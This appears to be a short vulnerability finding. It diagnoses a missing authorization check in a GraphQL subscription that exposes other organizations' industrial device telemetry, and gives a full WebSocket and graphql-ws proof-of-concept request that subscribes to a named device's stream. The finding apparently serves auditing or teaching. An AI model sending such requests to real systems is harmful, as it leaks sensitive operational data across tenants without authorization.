diagnosis: The subscription's subscribe classmethod accepts an arbitrary device_id and registers the client into the corresponding channel group without verifying that the authenticated user has access rights to that industrial Device. Any authenticated user can subscribe to live telemetry streams of sensitive equipment belonging to other organizations.
exploit_request:
POST /graphql/subscriptions/ HTTP/1.1
Host: iot.industrial-grid.net
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: graphql-ws

{"type":"start","id":"1","payload":{"query":"subscription { deviceTelemetry(deviceId: \"DEV-FACILITY-9941\") { telemetry { timestamp metricValue alertStatus } } }"}}
